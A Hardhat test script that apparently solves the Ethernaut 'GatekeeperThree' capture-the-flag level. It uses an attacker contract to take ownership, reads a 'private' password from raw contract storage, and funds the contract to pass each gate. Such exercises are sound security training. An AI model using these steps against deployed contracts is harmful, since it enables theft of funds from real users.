import {loadFixture} from "@nomicfoundation/hardhat-toolbox/network-helpers"
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Level 28 - GatekeeperThree contract hack", () => {
    async function setUp() {
        const [owner, hacker] = await ethers.getSigners();

        const GatekeeperThreeContract = await ethers.getContractFactory("GatekeeperThree");
        const GatekeeperThreeHackerContract = await ethers.getContractFactory("GatekeeperThreeHacker");
        
        const gatekeeperThree = await GatekeeperThreeContract.deploy();
        const gatekeeperThreeHacker = await GatekeeperThreeHackerContract.connect(hacker).deploy(await gatekeeperThree.getAddress());

        return {owner, hacker, gatekeeperThree, gatekeeperThreeHacker};
    };
    
    describe("When hacking", () => {
        it("Hacker should be able to read the private password variable and unlock it", async() => {
            const {owner, hacker, gatekeeperThree, gatekeeperThreeHacker} = await loadFixture(setUp);

            // The hacker sets the gatekeeper hacker contract as the gatekeeper owner.
            expect(await gatekeeperThree.owner()).to.equal(ethers.ZeroAddress);
            
            await gatekeeperThreeHacker.connect(hacker).becomeOwner();
            expect(await gatekeeperThree.owner()).to.equal(await gatekeeperThreeHacker.getAddress());

            // Then he creates the trick.
            await gatekeeperThree.connect(hacker).createTrick();

            // Then he gets allowance by reading from the private password variable.
            expect(await gatekeeperThree.allowEntrance()).to.equal(false);

            const password = await ethers.provider.getStorage(await gatekeeperThree.trick(), "0x02");
            await gatekeeperThree.connect(hacker).getAllowance(password);
            expect(await gatekeeperThree.allowEntrance()).to.equal(true);

            // The hacker transfers some ETH balance to the gatekeeper contract to pass the third gate.
            await hacker.sendTransaction({to: await gatekeeperThree.getAddress(), value: ethers.parseEther("0.001") + BigInt(1)});

            // Then he calls to enter through the gatekeeper hacker contract.
            expect(await gatekeeperThree.entrant()).to.equal(ethers.ZeroAddress);

            await gatekeeperThreeHacker.connect(hacker).enterGatekeeper();
            expect(await gatekeeperThree.entrant()).to.equal(hacker.address);
        });
    });
});